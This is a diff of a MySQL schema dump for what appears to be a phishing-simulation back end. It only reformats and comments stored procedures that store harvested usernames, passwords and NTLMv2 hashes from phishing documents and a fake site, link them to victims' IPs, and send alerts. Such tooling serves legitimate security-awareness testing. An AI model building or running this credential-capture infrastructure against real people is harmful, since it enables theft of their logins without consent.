@@ -78,7 +78,17 @@ CREATE TABLE `requests` (
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `CheckRecentlySubmitted`(IN InIP VARCHAR(100), IN InTarget VARCHAR(100), IN InOrg VARCHAR(100))
 BEGIN
-SELECT * FROM requests WHERE IP = InIP AND Target = InTarget AND Org = InOrg AND Datetime >= NOW() - INTERVAL 8 SECOND;
+
+-- LOOK BACK RECENTLY TO AVOID DUPLICATE RECORDS
+SELECT 
+    *
+FROM
+    requests
+WHERE
+    IP = InIP AND Target = InTarget
+        AND Org = InOrg
+        AND Datetime >= NOW() - INTERVAL 8 SECOND;
+
 END ;;
 DELIMITER ;
 /*!50003 SET sql_mode              = @saved_sql_mode */ ;
@@ -97,9 +107,13 @@ DELIMITER ;
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `CreateNotificationRef`(IN InType VARCHAR(100), IN InAPI_Token VARCHAR(1000), IN InChannel VARCHAR(100))
 BEGIN
+
+-- CREATE A UNIQUE IDENTIFIER FOR NOTIFICATION SETTINGS WHEN A DOCUMENT IS CREATED
 SET @UUID = UUID();
+
 INSERT INTO Notifications (Type, API_Token, Channel, UUID, Datetime) VALUES (InType, InAPI_Token, InChannel, @UUID, now());
 SELECT @UUID AS UUID;
+
 END ;;
 DELIMITER ;
 /*!50003 SET sql_mode              = @saved_sql_mode */ ;
@@ -118,7 +132,16 @@ DELIMITER ;
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `GetNotificationRef`(IN InUUID VARCHAR(1000))
 BEGIN
-SELECT * FROM Notifications WHERE UUID = InUUID ORDER BY Datetime desc;
+
+-- RETRIEVE NOTIFICATION SETTINGS FROM A UNIQUE ID IN THE URL "ID" PARAMETER
+SELECT 
+    *
+FROM
+    Notifications
+WHERE
+    UUID = InUUID
+ORDER BY Datetime DESC;
+
 END ;;
 DELIMITER ;
 /*!50003 SET sql_mode              = @saved_sql_mode */ ;
@@ -137,7 +160,15 @@ DELIMITER ;
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `GetUUIDRecord`(IN InUUID VARCHAR(1000))
 BEGIN
-SELECT * FROM requests WHERE UUID = InUUID;
+
+-- RETRIEVE ALL PHISH RECORDS ASSOCIATED WITH A DOCUMENT
+SELECT 
+    *
+FROM
+    requests
+WHERE
+    UUID = InUUID;
+    
 END ;;
 DELIMITER ;
 /*!50003 SET sql_mode              = @saved_sql_mode */ ;
@@ -156,7 +187,10 @@ DELIMITER ;
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `InsertRequests`(IN InIP VARCHAR(100), IN InTarget VARCHAR(100), IN InOrg VARCHAR(100), IN InUA VARCHAR(1000), IN InUUID VARCHAR(1000), IN InUser VARCHAR(100), IN InPass VARCHAR(100))
 BEGIN
+
+-- INSERT CAPTURED INFORMATION FROM AN OPENED DOCUMENT INTO THE "requests" TABLE
 INSERT INTO requests (Datetime, IP, Target, Org, UA, UUID, User, Pass) VALUES (now(), InIP,InTarget,InOrg,InUA,InUUID,InUser,InPass);
+
 END ;;
 DELIMITER ;
 /*!50003 SET sql_mode              = @saved_sql_mode */ ;
@@ -175,16 +209,46 @@ DELIMITER ;
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `MatchHashes`(IN InIP VARCHAR(100), IN InHash VARCHAR(1000))
 BEGIN
-UPDATE requests SET NTLMv2 = CONCAT(NTLMv2, '<br>', InHash) WHERE IP = InIP;
-UPDATE fakesite.stolencreds sc SET sc.Hash = CONCAT(sc.Hash, '<br>', InHash) WHERE sc.ip = InIP;
 
-SELECT DISTINCT 'PhishingDocs' as Title, rq.Target,rq.Org,nt.API_Token,nt.Channel,rq.UUID FROM requests rq 
-INNER JOIN Notifications nt on nt.UUID = rq.UUID
-WHERE rq.IP = InIP
-UNION
-SELECT 'FakeSite' as Title, sc.location as Target, '' as Org, '' as API_Token, '' as Channel, '' as UUID
-FROM fakesite.stolencreds sc WHERE sc.ip = InIP
+-- IF A HASH IS CAPTURED, COMPARE THE IP ADDRESS TO AN ACTIVE CAMPAIGN (fakesite or phishingdocs) AND UPDATE THE "requests" TABLE
+UPDATE requests 
+SET 
+    NTLMv2 = CONCAT(NTLMv2, '<br>', InHash)
+WHERE
+    IP = InIP;
+    
+UPDATE fakesite.stolencreds sc 
+SET 
+    sc.Hash = CONCAT(sc.Hash, '<br>', InHash)
+WHERE
+    sc.ip = InIP;
+
+SELECT DISTINCT
+    'PhishingDocs' AS Title,
+    rq.Target,
+    rq.Org,
+    nt.API_Token,
+    nt.Channel,
+    rq.UUID
+FROM
+    requests rq
+        INNER JOIN
+    Notifications nt ON nt.UUID = rq.UUID
+WHERE
+    rq.IP = InIP 
+UNION SELECT 
+    'FakeSite' AS Title,
+    sc.location AS Target,
+    '' AS Org,
+    '' AS API_Token,
+    '' AS Channel,
+    '' AS UUID
+FROM
+    fakesite.stolencreds sc
+WHERE
+    sc.ip = InIP
 LIMIT 1;
+
 END ;;
 DELIMITER ;
 /*!50003 SET sql_mode              = @saved_sql_mode */ ;
@@ -237,7 +301,15 @@ CREATE TABLE `stolencreds` (
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `CheckProjects`()
 BEGIN
-SELECT DISTINCT location FROM stolencreds WHERE location != '';
+
+-- RETURNS PROJECT LIST
+SELECT DISTINCT
+    location
+FROM
+    stolencreds
+WHERE
+    location != '';
+    
 END ;;
 DELIMITER ;
 /*!50003 SET sql_mode              = @saved_sql_mode */ ;
@@ -258,33 +330,57 @@ CREATE DEFINER=`root`@`localhost` PROCEDURE `GetAwards`(IN InProject VARCHAR(100
 BEGIN
 
 -- MOST DEDICATED
-select 'MostDedicated' as Title,username
-FROM (
-select username,count(password) as count from stolencreds sc WHERE sc.location = InProject AND sc.username = InUser GROUP BY username
-) sc
-WHERE count = 2
-UNION
+SELECT 
+    'MostDedicated' AS Title, username
+FROM
+    (SELECT 
+        username, COUNT(password) AS count
+    FROM
+        stolencreds sc
+    WHERE
+        sc.location = InProject
+            AND sc.username = InUser
+    GROUP BY username) sc
+WHERE
+    count = 2 
 -- MOST DELAYED
-SELECT 'MostDelayed' as Title,username 
-FROM (
-SELECT DATE_FORMAT(MAX(entered), '%Y-%m-%d') as LastDate,username
-FROM stolencreds
-WHERE location = InProject) iq
-WHERE datediff(DATE_FORMAT(NOW(), '%Y-%m-%d'), LastDate) >= 2
-UNION
+UNION SELECT 
+    'MostDelayed' AS Title, username
+FROM
+    (SELECT 
+        DATE_FORMAT(MAX(entered), '%Y-%m-%d') AS LastDate, username
+    FROM
+        stolencreds
+    WHERE
+        location = InProject) iq
+WHERE
+    DATEDIFF(DATE_FORMAT(NOW(), '%Y-%m-%d'), LastDate) >= 2
 -- MOST DISCLOSED PASSWORDS
-SELECT 'MostDisclosedPWs' as Title,username
-FROM (
-select username,count(DISTINCT password) as countpass from stolencreds WHERE location = InProject AND username = InUser GROUP BY username,password
-) iq
-WHERE countpass = 2
-UNION
+UNION SELECT 
+    'MostDisclosedPWs' AS Title, username
+FROM
+    (SELECT 
+        username, COUNT(DISTINCT password) AS countpass
+    FROM
+        stolencreds
+    WHERE
+        location = InProject
+            AND username = InUser
+    GROUP BY username , password) iq
+WHERE
+    countpass = 2 
 -- MOST PHISH
-SELECT 'MostPhish' as Title,iq.countrows as username
-FROM (
-select count(*) as countrows from stolencreds WHERE location = InProject
-) iq
-WHERE iq.countrows IN (50,60,70,80);
+UNION SELECT 
+    'MostPhish' AS Title, iq.countrows AS username
+FROM
+    (SELECT 
+        COUNT(*) AS countrows
+    FROM
+        stolencreds
+    WHERE
+        location = InProject) iq
+WHERE
+    iq.countrows IN (50 , 60, 70, 80);
 
 END ;;
 DELIMITER ;
@@ -304,7 +400,15 @@ DELIMITER ;
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `GetRecords`(IN InProject VARCHAR(1000))
 BEGIN
-SELECT * FROM stolencreds WHERE location = InProject;
+
+-- SELECT ALL RECORDS FOR THE SELECTED PROJECT
+SELECT 
+    *
+FROM
+    stolencreds
+WHERE
+    location = InProject;
+    
 END ;;
 DELIMITER ;
 /*!50003 SET sql_mode              = @saved_sql_mode */ ;
@@ -324,6 +428,7 @@ DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `InsertStolenCreds`(IN InUser VARCHAR(1000), IN InPass VARCHAR(1000), InIP VARCHAR(100), InLocation VARCHAR(1000), InToken VARCHAR(1000))
 BEGIN
 
+-- INSERT CAPTURED INFORMATION INTO stolencreds TABLE
 INSERT INTO stolencreds(username,password,entered,ip,location,token) VALUES(InUser,InPass,NOW(),InIP,InLocation,InToken);
 
 END ;;
@@ -344,7 +449,12 @@ DELIMITER ;
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `RemoveProject`(IN InProject VARCHAR(1000))
 BEGIN
-DELETE FROM stolencreds WHERE location = InProject;
+
+-- DELETE ALL RECORDS FOR THE SELECTED PROJECT
+DELETE FROM stolencreds 
+WHERE
+    location = InProject;
+
 END ;;
 DELIMITER ;
 /*!50003 SET sql_mode              = @saved_sql_mode */ ;
@@ -363,7 +473,13 @@ DELIMITER ;
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `RemoveRecord`(IN InProject VARCHAR(1000), IN InEntered TIMESTAMP)
 BEGIN
-DELETE FROM stolencreds WHERE location = InProject and entered = InEntered;
+
+-- DELETE SPECIFIC RECORD FOR SELECTED PROJECT
+DELETE FROM stolencreds 
+WHERE
+    location = InProject
+    AND entered = InEntered;
+
 END ;;
 DELIMITER ;
 /*!50003 SET sql_mode              = @saved_sql_mode */ ;
@@ -380,4 +496,4 @@ DELIMITER ;
 /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
 /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
 
--- Dump completed on 2018-10-08 15:00:08
+-- Dump completed on 2018-10-23 16:41:44
